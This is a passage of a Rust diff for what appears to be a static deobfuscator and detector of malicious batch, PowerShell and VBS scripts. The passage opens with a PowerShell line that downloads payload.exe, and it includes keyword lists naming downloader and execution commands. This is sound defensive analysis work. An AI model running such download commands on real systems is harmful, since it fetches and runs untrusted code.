             br#"powershell -Command "$u=$env:8STAGE;Invoke-WebRequest $u -OutFile payload.exe""#;
@@ -7811,10 +9454,18 @@ pub struct Report {
 // block inside a CMD-skipped region. Pre-scan and queue the script body by
 // language so JS/VBS payload scanners still see inner IOCs.
 fn pre_scan_polyglot_script_block(input: &[u8], env: &mut Environment) {
+    if !input.contains(&b'<') || !contains_ascii_case_insensitive_bytes(input, b"<script") {
+        return;
+    }
+
     let text = String::from_utf8_lossy(input);
     let mut idx = 0usize;
     while let Some(abs_open) = crate::util::find_ascii_case_insensitive_from(&text, "<script", idx)
     {
+        if script_tag_is_inside_cmd_comment_line(&text, abs_open) {
+            idx = abs_open + "<script".len();
+            continue;
+        }
         // find the closing `>` of the opening tag
         let Some(tag_end_rel) = text[abs_open..].find('>') else {
             break;
@@ -7832,70 +9483,120 @@ fn pre_scan_polyglot_script_block(input: &[u8], env: &mut Environment) {
             let tag = &text[abs_open..abs_open + tag_end_rel + 1];
             let payload = body.as_bytes().to_vec();
             if crate::util::contains_ascii_case_insensitive(tag, "vbscript") {
-                push_unique_payload(&mut env.all_extracted_vbs, payload);
+                env.push_extracted_vbs(payload);
             } else if crate::util::contains_ascii_case_insensitive(tag, "jscript")
                 || crate::util::contains_ascii_case_insensitive(tag, "javascript")
                 || crate::util::contains_ascii_case_insensitive(tag, "ecmascript")
                 || !looks_like_vbs_script(&body.to_ascii_lowercase())
             {
-                push_unique_payload(&mut env.all_extracted_jscript, payload);
+                env.push_extracted_jscript(payload);
             } else {
-                push_unique_payload(&mut env.all_extracted_vbs, payload);
+                env.push_extracted_vbs(payload);
             }
         }
         idx = body_end + "</script>".len();
     }
 }
 
+fn pre_scan_batch_js_comment_polyglot(text: &str, env: &mut Environment) {
+    let trimmed_start = text.trim_start_matches(['\u{feff}', '\r', '\n', ' ', '\t']);
+    if !trimmed_start.starts_with("/*")
+        || !contains_ascii_case_insensitive_bytes(trimmed_start.as_bytes(), b"*/ //")
+    {
+        return;
+    }
+
+    let lower = trimmed_start.to_ascii_lowercase();
+    if !lower.contains("\nvar ")
+        || !(lower.contains("this[")
+            || lower.contains("activexobject")
+            || lower.contains("wscript")
+            || lower.contains(".run")
+            || lower.contains(".exec"))
+    {
+        return;
+    }
+
+    let payload = trim_tool_omission_summaries_from_script_tail(trimmed_start).trim_end();
+    if payload.len() < 32 {
+        return;
+    }
+    env.push_extracted_jscript(payload.as_bytes().to_vec());
+}
+
+fn trim_tool_omission_summaries_from_script_tail(text: &str) -> &str {
+    let mut end = text.len();
+    let mut cursor = 0usize;
+    for line in text.split_inclusive('\n') {
+        let line_start = cursor;
+        cursor += line.len();
+        let (body, _) = split_line_ending(line);
+        if body.trim_start().starts_with("rem omitted ") {
+            end = line_start;
+            break;
+        }
+    }
+    &text[..end]
+}
+
+fn script_tag_is_inside_cmd_comment_line(text: &str, tag_start: usize) -> bool {
+    let line_start = text[..tag_start]
+        .rfind(['\r', '\n'])
+        .map_or(0, |idx| idx + 1);
+    let prefix = text[line_start..tag_start].trim_start_matches(['@', ' ', '\t']);
+    if prefix.starts_with("::") {
+        return true;
+    }
+    rem_comment_payload(prefix).is_some()
+}
+
 fn pre_scan_utf16_script_blob(decoded: &str, env: &mut Environment) {
-    let looks_vbs = crate::util::contains_ascii_case_insensitive(decoded, "createobject")
-        || crate::util::contains_ascii_case_insensitive(decoded, "wscript")
-        || crate::util::contains_ascii_case_insensitive(decoded, "xmlhttp")
-        || crate::util::contains_ascii_case_insensitive(decoded, "private function")
-        || crate::util::contains_ascii_case_insensitive(decoded, "option explicit")
-        || crate::util::contains_ascii_case_insensitive(decoded, "\ndim ")
-        || crate::util::starts_with_ascii_case_insensitive(decoded, "dim ");
-    let looks_js = crate::util::contains_ascii_case_insensitive(decoded, "activexobject")
-        || crate::util::contains_ascii_case_insensitive(decoded, "<script")
-        || crate::util::contains_ascii_case_insensitive(decoded, "document.")
-        || crate::util::contains_ascii_case_insensitive(decoded, "window.")
-        || crate::util::contains_ascii_case_insensitive(decoded, "function ")
-        || crate::util::contains_ascii_case_insensitive(decoded, "var ")
-        || crate::util::contains_ascii_case_insensitive(decoded, "eval(");
+    let lower = decoded.to_ascii_lowercase();
+    let looks_vbs = looks_like_vbs_script(&lower);
+    let looks_js = looks_like_js_script(&lower);
 
     if looks_vbs {
         let payload = decoded.as_bytes().to_vec();
-        if !env
-            .all_extracted_vbs
-            .iter()
-            .any(|existing| existing == &payload)
-        {
-            env.all_extracted_vbs.push(payload);
-        }
-    }
-    if looks_js {
+        env.push_extracted_vbs(payload);
+    } else if looks_js {
         let payload = decoded.as_bytes().to_vec();
-        if !env
-            .all_extracted_jscript
-            .iter()
-            .any(|existing| existing == &payload)
-        {
-            env.all_extracted_jscript.push(payload);
-        }
-    }
-}
-
-fn push_unique_payload(payloads: &mut Vec<Vec<u8>>, payload: Vec<u8>) {
-    if !payloads.iter().any(|existing| existing == &payload) {
-        payloads.push(payload);
+        env.push_extracted_jscript(payload);
     }
 }
 
 fn contains_ascii_case_insensitive_bytes(haystack: &[u8], needle: &[u8]) -> bool {
-    !needle.is_empty()
-        && haystack
-            .windows(needle.len())
-            .any(|window| window.eq_ignore_ascii_case(needle))
+    contains_ascii_case_insensitive_bytes_fast(haystack, needle)
+}
+
+fn contains_ascii_case_insensitive_bytes_fast(haystack: &[u8], needle: &[u8]) -> bool {
+    if needle.is_empty() || needle.len() > haystack.len() {
+        return false;
+    }
+    let first = needle[0].to_ascii_lowercase();
+    let last_start = haystack.len() - needle.len();
+    let mut idx = 0usize;
+    while idx <= last_start {
+        if haystack[idx].to_ascii_lowercase() == first {
+            let mut matched = true;
+            for offset in 1..needle.len() {
+                if !haystack[idx + offset].eq_ignore_ascii_case(&needle[offset]) {
+                    matched = false;
+                    break;
+                }
+            }
+            if matched {
+                return true;
+            }
+        }
+        idx += 1;
+    }
+    false
+}
+
+fn starts_with_ascii_case_insensitive_bytes(haystack: &[u8], needle: &[u8]) -> bool {
+    haystack
+        .get(..needle.len())
+        .is_some_and(|prefix| prefix.eq_ignore_ascii_case(needle))
 }
 
 fn looks_like_vbs_script(lower: &str) -> bool {
@@ -7923,9 +9624,9 @@ fn looks_like_js_script(lower: &str) -> bool {
         || lower.contains("<script")
         || lower.contains("document.")
         || lower.contains("window.")
-        || lower.contains("function ")
         || lower.contains("var ")
         || lower.contains("eval(")
+        || (lower.contains("function ") && !looks_like_vbs_script(lower))
 }
 
 fn first_meaningful_script_line(lower: &str) -> &str {
@@ -7976,30 +9677,108 @@ fn starts_like_standalone_powershell(lower: &str) -> bool {
 }
 
 fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool {
-    let text = String::from_utf8_lossy(input);
-    let lower = text.to_ascii_lowercase();
-    if starts_like_standalone_powershell(&lower) && crate::ps_alias::looks_like_powershell(&text) {
-        push_unique_payload(&mut env.all_extracted_ps1, text.as_bytes().to_vec());
-        return true;
+    let first_line = first_meaningful_input_line(input);
+    if !first_line_starts_like_standalone_script(first_line) {
+        return false;
     }
 
+    let has_ps_atom = contains_ascii_case_insensitive_bytes(input, b"powershell")
+        || contains_ascii_case_insensitive_bytes(input, b"invoke-")
+        || contains_ascii_case_insensitive_bytes(input, b"new-object")
+        || contains_ascii_case_insensitive_bytes(input, b"start-process")
+        || contains_ascii_case_insensitive_bytes(input, b"iex ")
+        || contains_ascii_case_insensitive_bytes(input, b"iwr ")
+        || contains_ascii_case_insensitive_bytes(input, b"irm ");
     let has_vbs_atom = contains_ascii_case_insensitive_bytes(input, b"createobject")
         || contains_ascii_case_insensitive_bytes(input, b"wscript")
         || contains_ascii_case_insensitive_bytes(input, b"xmlhttp")
         || contains_ascii_case_insensitive_bytes(input, b"option explicit");
-    if !has_vbs_atom {
+    if !has_ps_atom && !has_vbs_atom {
         return false;
     }
 
+    let text = String::from_utf8_lossy(input);
+    let lower = text.to_ascii_lowercase();
+    if has_ps_atom
+        && starts_like_standalone_powershell(&lower)
+        && crate::ps_alias::looks_like_powershell(&text)
+    {
+        push_extracted_ps1_for_later_analysis(text.as_bytes().to_vec(), env);
+        return true;
+    }
+
+    if !has_vbs_atom {
+        return false;
+    }
     if starts_like_standalone_vbs(&lower) && looks_like_vbs_script(&lower) {
-        push_unique_payload(&mut env.all_extracted_vbs, text.as_bytes().to_vec());
+        env.push_extracted_vbs(text.as_bytes().to_vec());
         return true;
     }
     false
 }
 
+fn first_meaningful_input_line(input: &[u8]) -> &[u8] {
+    let mut rest = input;
+    if let Some(stripped) = rest.strip_prefix(b"\xef\xbb\xbf") {
+        rest = stripped;
+    }
+    for raw_line in rest.split(|byte| *byte == b'\n') {
+        let line = trim_ascii_start_bytes(raw_line.strip_suffix(b"\r").unwrap_or(raw_line));
+        if line.is_empty()
+            || line.starts_with(b"'")
+            || line.starts_with(b"//")
+            || line.starts_with(b"/*")
+        {
+            continue;
+        }
+        return line;
+    }
+    b""
+}
+
+fn trim_ascii_start_bytes(bytes: &[u8]) -> &[u8] {
+    let start = bytes
+        .iter()
+        .position(|byte| !byte.is_ascii_whitespace())
+        .unwrap_or(bytes.len());
+    &bytes[start..]
+}
+
+fn first_line_starts_like_standalone_script(line: &[u8]) -> bool {
+    line.starts_with(b"$")
+        || line.starts_with(b"&")
+        || starts_with_ascii_case_insensitive_bytes(line, b"iwr ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"irm ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"iex ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"invoke-webrequest ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"invoke-restmethod ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"invoke-expression ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"new-object ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"start-process ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"dim ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"const ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"set ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"with ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"execute ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"executeglobal ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"option explicit")
+        || starts_with_ascii_case_insensitive_bytes(line, b"private function")
+        || starts_with_ascii_case_insensitive_bytes(line, b"on error ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"sub ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"public sub ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"private sub ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"public function ")
+        || starts_with_ascii_case_insensitive_bytes(line, b"function ")
+}
+
 fn pre_scan_damaged_powershell_handoff(input: &[u8], env: &mut Environment) {
     use base64::Engine;
+
+    if !contains_ascii_case_insensitive_bytes(input, b"getstring")
+        || !contains_ascii_case_insensitive_bytes(input, b"replace")
+    {
+        return;
+    }
 
     let text = String::from_utf8_lossy(input);
     if !crate::util::contains_ascii_case_insensitive(&text, "getstring")
@@ -8024,7 +9803,7 @@ fn pre_scan_damaged_powershell_handoff(input: &[u8], env: &mut Environment) {
         {
             continue;
         }
-        push_unique_payload(&mut env.all_extracted_ps1, decoded.into_bytes());
+        push_extracted_ps1_for_later_analysis(decoded.into_bytes(), env);
     }
 }
 
@@ -8084,6 +9863,24 @@ fn quoted_base64ish_literals(text: &str) -> Vec<String> {
     out
 }
 
+fn should_skip_final_deob_text_scan(out: &str) -> bool {
+    let mut saw_omission = false;
+    for line in out.lines() {
+        let trimmed = line.trim();
+        if trimmed.is_empty() {
+            continue;
+        }
+        if !trimmed.starts_with("rem omitted ") {
+            return false;
+        }
+        saw_omission = true;
+        if trimmed.contains("://") {
+            return false;
+        }
+    }
+    saw_omission
+}
+
 fn parse_simple_quoted_arg(text: &str, idx: usize) -> Option<(String, usize)> {
     let quote = *text.as_bytes().get(idx)?;
     if quote != b'\'' && quote != b'"' {
@@ -8136,6 +9933,9 @@ fn decode_utf16le_script_blob(input: &[u8]) -> Option<String> {
     if input.len() > MAX_UTF16_DECODE_BYTES {
         return None;
     }
+    if large_input_prefix_rules_out_utf16le(input) {
+        return None;
+    }
     if !looks_like_utf16le(input) {
         return None;
     }
@@ -8153,7 +9953,13 @@ fn decode_utf16le_script_blob(input: &[u8]) -> Option<String> {
         || crate::util::contains_ascii_case_insensitive(&decoded, "activexobject")
         || crate::util::contains_ascii_case_insensitive(&decoded, "function ")
         || crate::util::contains_ascii_case_insensitive(&decoded, "var ")
-        || crate::util::contains_ascii_case_insensitive(&decoded, "eval(");
+        || crate::util::contains_ascii_case_insensitive(&decoded, "eval(")
+        || crate::util::contains_ascii_case_insensitive(&decoded, "@echo")
+        || crate::util::contains_ascii_case_insensitive(&decoded, "setlocal")
+        || crate::util::contains_ascii_case_insensitive(&decoded, "goto ")
+        || crate::util::contains_ascii_case_insensitive(&decoded, "cmd /c")
+        || crate::util::contains_ascii_case_insensitive(&decoded, "powershell")
+        || crate::util::contains_ascii_case_insensitive(&decoded, "certutil");
     if looks_script {
         Some(decoded)
     } else {
@@ -8169,6 +9975,32 @@ fn looks_like_utf16le(bytes: &[u8]) -> bool {
     let even_nonzero = bytes.iter().step_by(2).filter(|b| **b != 0).count();
     let odd_zero = bytes.iter().skip(1).step_by(2).filter(|b| **b == 0).count();
     even_nonzero * 2 >= pairs && odd_zero * 2 >= pairs
+}
+
+fn large_input_prefix_rules_out_utf16le(bytes: &[u8]) -> bool {
+    const MIN_PREFIX_REJECT_BYTES: usize = 64 * 1024;
+    const PREFIX_SAMPLE_BYTES: usize = 8192;
+
+    if bytes.len() < MIN_PREFIX_REJECT_BYTES {
+        return false;
+    }
+    let sample_len = bytes.len().min(PREFIX_SAMPLE_BYTES) & !1;
+    if sample_len < 4 {
+        return false;
+    }
+    let pairs = sample_len / 2;
+    let even_nonzero = bytes[..sample_len]
+        .iter()
+        .step_by(2)
+        .filter(|byte| **byte != 0)
+        .count();
+    let odd_zero = bytes[..sample_len]
+        .iter()
+        .skip(1)
+        .step_by(2)
+        .filter(|byte| **byte == 0)
+        .count();
+    !(even_nonzero * 2 >= pairs && odd_zero * 2 >= pairs)
 }
 
 /// Statically deobfuscate a Windows batch / cmd / PowerShell / VBS / JScript
@@ -8401,7 +10233,122 @@ fn analyze_inner(
     if cfg.self_extract {
         env.input_bytes = Some(std::sync::Arc::from(input));
     }
+    if looks_like_pe(input) {
+        return disguised_binary_report(
+            input,
+            env,
+            "pe",
+            "disguised-pe-input",
+            cfg.max_traits_per_kind,
+        );
+    }
+    if let Some(fmt) = detect_disguised_binary(input) {
+        let label = format!("disguised-{fmt}-input");
+        return disguised_binary_report(input, env, fmt, &label, cfg.max_traits_per_kind);
+    }
+    if let Some(blob) = extract_github_blob_raw_lines(input) {
+        let nested_file_path = env.file_path.clone();
+        let mut report = analyze_inner(blob.content.as_bytes(), cfg, nested_file_path, options);
+        let mut summary = format!(
+            "rem omitted GitHub HTML blob wrapper for {} ({} wrapper bytes)",
+            blob.path.as_deref().unwrap_or("embedded file"),
+            input.len()
+        );
+        if let Some(raw_url) = blob.raw_url.as_deref() {
+            summary.push_str("; raw blob: ");
+            summary.push_str(raw_url);
+        }
+        summary.push_str("\r\n");
+        summary.push_str(&report.deobfuscated);
+        report.deobfuscated = summary;
+        report.traits.insert(
+            0,
+            Trait::LineTruncated {
+                original_len: input.len() as u64,
+            },
+        );
+        dedup_traits(&mut report.traits, cfg.max_traits_per_kind);
+        return report;
+    }
+    if let Some(blob) = extract_github_large_blob_placeholder(input) {
+        let mut summary = format!(
+            "rem omitted GitHub HTML blob wrapper for {} ({} wrapper bytes)",
+            blob.path.as_deref().unwrap_or("embedded file"),
+            input.len()
+        );
+        if let Some(raw_url) = blob.raw_url.as_deref() {
+            summary.push_str("; raw blob: ");
+            summary.push_str(raw_url);
+        }
+        let mut traits = vec![Trait::LineTruncated {
+            original_len: input.len() as u64,
+        }];
+        if let Some(raw_url) = blob.raw_url {
+            traits.push(Trait::DownloadInDeobText {
+                src: raw_url,
+                line_hint: "github-raw-blob".to_string(),
+            });
+        }
+        dedup_traits(&mut traits, cfg.max_traits_per_kind);
+        return Report {
+            deobfuscated: summary,
+            traits,
+            extracted_cmd: Vec::new(),
+            extracted_ps1: Vec::new(),
+            extracted_ps1_normalized: Vec::new(),
+            extracted_jscript: Vec::new(),
+            extracted_vbs: Vec::new(),
+            recovered_pe: Vec::new(),
+        };
+    }
+    let (raw_scan_input, inert_nul_padding_suffix_len) =
+        split_inert_nul_padding_suffix_bytes(input)
+            .map(|(prefix, padding_len)| (prefix, Some(padding_len)))
+            .unwrap_or((input, None));
     let mut out = String::new();
+    let decoded_utf16_script = decode_utf16le_script_blob(raw_scan_input);
+    let raw_text;
+    let raw_scan_text = if let Some(decoded) = decoded_utf16_script.as_deref() {
+        trim_inert_nul_padding_suffix_text(decoded)
+    } else {
+        raw_text = String::from_utf8_lossy(raw_scan_input);
+        trim_inert_nul_padding_suffix_text(&raw_text)
+    };
+    // This generated diagnostic carrier can occupy multiple megabytes. Reduce
+    // it before broad raw-source scanners so its inert contents are neither
+    // interpreted nor mistaken for embedded scripts.
+    let summarized_raw_windows_profile_checks =
+        summarize_repeated_windows_profile_check_blocks(raw_scan_text, &mut env);
+    let raw_scan_text = summarized_raw_windows_profile_checks
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    // Collapse giant unresolved percent-noise before broad raw-source scans.
+    // The original bytes remain available for later artifact recovery, while
+    // these scans only need the surviving commands and compact summaries.
+    let summarized_early_raw_percent_noise = if raw_scan_text.len() >= 1024
+        && raw_scan_text.contains('%')
+        && has_oversize_percent_noise_candidate_line(raw_scan_text)
+    {
+        let summarized = summarize_long_unresolved_percent_noise_lines(raw_scan_text, &mut env);
+        (summarized != raw_scan_text).then_some(summarized)
+    } else {
+        None
+    };
+    let raw_scan_text = summarized_early_raw_percent_noise
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    let summarized_early_echo_base64_pe = if raw_scan_text.contains('>')
+        && crate::util::contains_ascii_case_insensitive(raw_scan_text, "echo")
+    {
+        summarize_echo_base64_redirect_runs(raw_scan_text, &mut env, true)
+            .filter(|summarized| summarized != raw_scan_text)
+    } else {
+        None
+    };
+    let raw_scan_text = summarized_early_echo_base64_pe
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+
     // FE-DOSfuscation pattern: scripts that reference `!VAR!` without an
     // explicit `setlocal enabledelayedexpansion` are almost certainly meant
     // to run under `cmd /v:on` (the FireEye DOSfuscation report's
@@ -8412,75 +10359,496 @@ fn analyze_inner(
     // script doesn't explicitly DISABLE it. Real `setlocal
     // enabledelayedexpansion` / `cmd /v:on` codepaths re-set this same
     // flag, so this only matters when both are missing.
-    if has_bang_var_reference(input) && !has_disable_delayed_expansion(input) {
+    if has_bang_var_reference(raw_scan_text.as_bytes())
+        && !has_disable_delayed_expansion(raw_scan_text.as_bytes())
+    {
         env.delayed_expansion = true;
     }
-    pre_scan_polyglot_script_block(input, &mut env);
-    let standalone_script_input = pre_scan_standalone_script_input(input, &mut env);
-    pre_scan_damaged_powershell_handoff(input, &mut env);
-    deob_scan::scan_raw_marker_powershell_urls(input, &mut env);
-    if looks_like_pe(input) {
-        env.traits.push(Trait::DisguisedBinary {
-            format: "pe".to_string(),
-            size: input.len() as u64,
-        });
-        env.recovered_pe
-            .push(("disguised-pe-input".to_string(), input.to_vec()));
-        scan_binary_input_urls(input, &mut env);
-    } else if let Some(fmt) = detect_disguised_binary(input) {
-        // Non-PE binary formats masquerading as `.bat`/`.cmd`/`.ps1`
-        // (CAB / ZIP / RAR / 7z / LNK / PDF / image). Persist the bytes
-        // so analysts can pull the real file out — same dump mechanism
-        // as the AES-recovered PE blobs.
-        env.traits.push(Trait::DisguisedBinary {
-            format: fmt.to_string(),
-            size: input.len() as u64,
-        });
-        env.recovered_pe
-            .push((format!("disguised-{fmt}-input"), input.to_vec()));
-        scan_binary_input_urls(input, &mut env);
+    pre_scan_polyglot_script_block(raw_scan_text.as_bytes(), &mut env);
+    let standalone_script_input =
+        pre_scan_standalone_script_input(raw_scan_text.as_bytes(), &mut env);
+    pre_scan_damaged_powershell_handoff(raw_scan_text.as_bytes(), &mut env);
+    if let Some(report) = summarize_large_public_activation_utility_report(
+        raw_scan_text,
+        input.len(),
+        &mut env,
+        cfg.max_traits_per_kind,
+    ) {
+        return report;
+    }
+    let summarized_raw_base64_pe = if has_embedded_base64_pe_carrier_hint(raw_scan_input) {
+        let summarized =
+            summarize_multiline_base64_pe_carrier_blocks(raw_scan_text.to_string(), &mut env);
+        (summarized != raw_scan_text).then_some(summarized)
     } else {
-        if let Some(decoded) = decode_utf16le_script_blob(input) {
-            pre_scan_utf16_script_blob(&decoded, &mut env);
-            out = decoded;
-        } else if standalone_script_input {
-            out = String::from_utf8_lossy(input).into_owned();
+        None
+    };
+    let raw_scan_text = summarized_raw_base64_pe.as_deref().unwrap_or(raw_scan_text);
+    let summarized_raw_colon_comment =
+        summarize_long_double_colon_payload_lines(raw_scan_text, &mut env);
+    let raw_scan_text = summarized_raw_colon_comment
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    let summarized_repetitive_rem_noise = if contains_rem_comment_candidate(raw_scan_text) {
+        summarize_repetitive_rem_noise_runs(raw_scan_text, &mut env)
+    } else {
+        None
+    };
+    let raw_scan_text = summarized_repetitive_rem_noise
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    let summarized_raw_opaque_base64 =
+        summarize_long_opaque_base64_carrier_lines(raw_scan_text, &mut env);
+    let raw_scan_text = summarized_raw_opaque_base64
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    let summarized_early_opaque_payload =
+        summarize_opaque_payload_tail_lines(raw_scan_text, &mut env);
+    let raw_scan_text = summarized_early_opaque_payload
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    deob_scan::scan_raw_marker_powershell_urls(raw_scan_text.as_bytes(), &mut env);
+    let summarized_pem_pe = summarize_pem_pe_payload(raw_scan_text, &mut env);
+    let raw_scan_text = summarized_pem_pe.as_deref().unwrap_or(raw_scan_text);
+    if raw_scan_text.len() >= 1024 && raw_scan_text.contains('%') {
+        preconsume_raw_simple_sets_before_percent_noise_summary(raw_scan_text, &mut env);
+        preconsume_percent_setter_alias_assignments_before_percent_noise_summary(
+            raw_scan_text,
+            &mut env,
+        );
+        preconsume_percent_wrapped_single_char_sets_before_percent_noise_summary(
+            raw_scan_text,
+            &mut env,
+        );
+        preconsume_raw_marker_sets_before_percent_noise_summary(raw_scan_text, &mut env);
+        preconsume_materialized_percent_substr_sets_before_percent_noise_summary(
+            raw_scan_text,
+            &mut env,
+        );
+    }
+    let summarized_raw_binary_noise = if raw_scan_text
+        .as_bytes()
+        .iter()
+        .any(|b| (*b < 0x20 && !matches!(*b, b'\r' | b'\n' | b'\t')) || *b >= 0x7f)
+    {
+        let summarized = summarize_binary_noise_line_runs(raw_scan_text, &mut env);
+        (summarized != raw_scan_text).then_some(summarized)
+    } else {
+        None
+    };
+    let raw_scan_text = summarized_raw_binary_noise
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    let summarized_raw_long_rem = if contains_rem_comment_candidate(raw_scan_text)
+        || contains_caret_rem_comment_candidate(raw_scan_text)
+    {
+        let summarized = summarize_long_rem_comment_lines(raw_scan_text, &mut env);
+        (summarized != raw_scan_text).then_some(summarized)
+    } else {
+        None
+    };
+    let raw_scan_text = summarized_raw_long_rem.as_deref().unwrap_or(raw_scan_text);
+    let summarized_raw_percent_noise = if raw_scan_text.len() >= 1024 && raw_scan_text.contains('%')
+    {
+        preconsume_raw_simple_sets_before_percent_noise_summary(raw_scan_text, &mut env);
+        preconsume_percent_setter_alias_assignments_before_percent_noise_summary(
+            raw_scan_text,
+            &mut env,
+        );
+        preconsume_percent_wrapped_single_char_sets_before_percent_noise_summary(
+            raw_scan_text,
+            &mut env,
+        );
+        preconsume_raw_marker_sets_before_percent_noise_summary(raw_scan_text, &mut env);
+        preconsume_materialized_percent_substr_sets_before_percent_noise_summary(
+            raw_scan_text,
+            &mut env,
+        );
+        let summarized = summarize_long_unresolved_percent_noise_lines(raw_scan_text, &mut env);
+        (summarized != raw_scan_text).then_some(summarized)
+    } else {
+        None
+    };
+    let raw_scan_text = summarized_raw_percent_noise
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    let summarized_static_for_data_lists =
+        summarize_large_static_for_data_lists(raw_scan_text, &mut env);
+    let raw_scan_text = summarized_static_for_data_lists
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    let summarized_tail_reversed_gzip_pe =
+        summarize_tail_reversed_gzip_pe_payload(raw_scan_text, &mut env);
+    let raw_scan_text = summarized_tail_reversed_gzip_pe
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    let summarized_raw_alpha_echo = summarize_long_alpha_echo_lines(raw_scan_text, &mut env);
+    let raw_scan_text = summarized_raw_alpha_echo
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    let summarized_tail_spaced_ps1 =
+        summarize_tail_spaced_powershell_payload(raw_scan_text, &mut env);
+    let raw_scan_text = summarized_tail_spaced_ps1
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    let summarized_tail_base64_ps1 =
+        summarize_tail_base64_powershell_payload(raw_scan_text, &mut env);
+    let raw_scan_text = summarized_tail_base64_ps1
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    let summarized_self_tail_base64 = if looks_like_self_tail_base64_loader_text(raw_scan_text) {
+        let summarized = summarize_self_tail_base64_payloads(raw_scan_text, &mut env);
+        (summarized != raw_scan_text).then_some(summarized)
+    } else {
+        None
+    };
+    let raw_scan_text = summarized_self_tail_base64
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    let summarized_raw_encoded_set_carriers = if raw_scan_text.len() >= 16 * 1024
+        && contains_ascii_case_insensitive_bytes(raw_scan_text.as_bytes(), b"set ")
+    {
+        let summarized = summarize_encoded_set_carrier_line_runs(raw_scan_text, &mut env);
+        (summarized != raw_scan_text).then_some(summarized)
+    } else {
+        None
+    };
+    let raw_scan_text = summarized_raw_encoded_set_carriers
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    let summarized_echo_base64_pe =
+        summarize_echo_base64_redirect_runs(raw_scan_text, &mut env, true);
+    let raw_scan_text = summarized_echo_base64_pe
+        .as_deref()
+        .unwrap_or(raw_scan_text);
+    let raw_scan_text_was_summarized = summarized_early_raw_percent_noise.is_some()
+        || summarized_early_echo_base64_pe.is_some()
+        || summarized_raw_base64_pe.is_some()
+        || summarized_raw_colon_comment.is_some()
+        || summarized_repetitive_rem_noise.is_some()
+        || summarized_raw_opaque_base64.is_some()
+        || summarized_early_opaque_payload.is_some()
+        || summarized_pem_pe.is_some()
+        || summarized_raw_binary_noise.is_some()
+        || summarized_raw_long_rem.is_some()
+        || summarized_raw_percent_noise.is_some()
+        || summarized_static_for_data_lists.is_some()
+        || summarized_tail_reversed_gzip_pe.is_some()
+        || summarized_raw_alpha_echo.is_some()
+        || summarized_tail_spaced_ps1.is_some()
+        || summarized_tail_base64_ps1.is_some()
+        || summarized_self_tail_base64.is_some()
+        || summarized_raw_encoded_set_carriers.is_some()
+        || summarized_raw_windows_profile_checks.is_some()
+        || summarized_echo_base64_pe.is_some();
+    let summarized_raw_scan_text = if raw_scan_text_was_summarized {
+        Some(raw_scan_text.to_string())
+    } else {
+        summarize_opaque_payload_tail_lines(raw_scan_text, &mut env)
+    };
+    let raw_scan_text_for_analysis = summarized_raw_scan_text.as_deref().unwrap_or(raw_scan_text);
+    let raw_scan_text_has_large_carrier_summary = summarized_early_raw_percent_noise.is_some()
+        || summarized_early_echo_base64_pe.is_some()
+        || summarized_raw_opaque_base64.is_some()
+        || summarized_raw_percent_noise.is_some()
+        || summarized_raw_encoded_set_carriers.is_some()
+        || summarized_raw_windows_profile_checks.is_some()
+        || summarized_tail_reversed_gzip_pe.is_some()
+        || summarized_tail_base64_ps1.is_some()
+        || summarized_static_for_data_lists.is_some()
+        || summarized_repetitive_rem_noise.is_some()
+        || summarized_raw_long_rem.is_some()
+        || summarized_echo_base64_pe.is_some();
+    let standalone_inline_powershell_summary =
+        if !standalone_script_input && !raw_scan_text_has_large_carrier_summary {
+            summarize_standalone_inline_powershell_command(raw_scan_text_for_analysis, &mut env)
         } else {
-            drive(input, &mut env, &mut out);
+            None
+        };
+    seed_large_encoded_set_assignments_from_text(raw_scan_text_for_analysis, &mut env);
+    if let Some(decoded) = decoded_utf16_script.as_deref() {
+        pre_scan_utf16_script_blob(decoded, &mut env);
+        out = trim_inert_nul_padding_suffix_text(decoded).to_string();
+        if let Some(summarized) = summarize_vbs_base64_string_carriers(&out, &mut env) {
+            out = summarized;
         }
-        out = summarize_long_rem_comment_lines(&out, &mut env);
-        out = summarize_binary_noise_line_runs(&out, &mut env);
-        let raw_text = String::from_utf8_lossy(input);
-        deob_scan::scan_embedded_powershell_invocations(&raw_text, &mut env);
-        deob_scan::scan_embedded_powershell_invocations(&out, &mut env);
-        deob_scan::scan_copied_powershell_invocations(&out, &mut env);
-        env.all_extracted_ps1
-            .extend(std::mem::take(&mut env.exec_ps1));
-        analyze_extracted_payloads(&mut env, 1);
-        ps1_scan::extract_self_embedded_ps1(&mut env, &out);
-        ps1_scan::scan_ps1_payloads(&mut env);
+        if let Some(summarized) = summarize_large_vbs_utility_carrier(&out, &mut env) {
+            out = summarized;
+        }
+    } else if standalone_script_input {
+        out = raw_scan_text_for_analysis.to_string();
+    } else if let Some(summarized) = standalone_inline_powershell_summary.as_ref() {
+        out = summarized.clone();
+    } else {
+        drive(
+            summarized_raw_scan_text
+                .as_ref()
